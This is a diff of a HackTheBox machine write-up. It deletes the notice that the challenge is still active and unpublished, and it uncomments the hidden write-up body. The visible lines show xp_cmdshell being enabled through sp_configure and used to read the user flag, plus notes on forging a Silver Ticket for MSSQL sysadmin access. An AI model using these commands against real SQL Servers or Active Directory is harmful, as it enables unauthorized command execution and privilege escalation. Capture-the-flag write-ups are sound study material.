@@ -22,11 +22,6 @@ Hints: True
 |   9  | `mssqlsvc` (SQL dbo/sysadmin)  | `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`                                                                       | Enabled `xp_cmdshell` for command execution inside SQL Server.                                                |
 |  10  | `mssqlsvc` (SQL dbo/sysadmin)  | `EXEC xp_cmdshell 'type C:\Users\mssqlsvc\Desktop\user.txt'`                                                                                                                        | Read `user.txt` (user flag) from `mssqlsvc`'s desktop.                                                        |
 
-**⚠️ Notice:
-This challenge is currently active on HackTheBox.
-In accordance with HackTheBox's content policy, this writeup will be made publicly available only after the challenge is retired.**
-
-<!--
 
 ## Nmap Recon
 
@@ -323,4 +318,4 @@ EXEC xp_cmdshell 'type C:\\Users\\mssqlsvc\\Desktop\\user.txt';
 * The PAC must include the necessary group RIDs (e.g., `SIGNED\IT`) for the service to accept elevated privileges.
 * With a valid Silver Ticket for `MSSQLSvc/DC01:1433` you can authenticate as a high-privilege account (here `mssqlsvc` with sysadmin) and enable `xp_cmdshell` to access local files.
 
--->
+
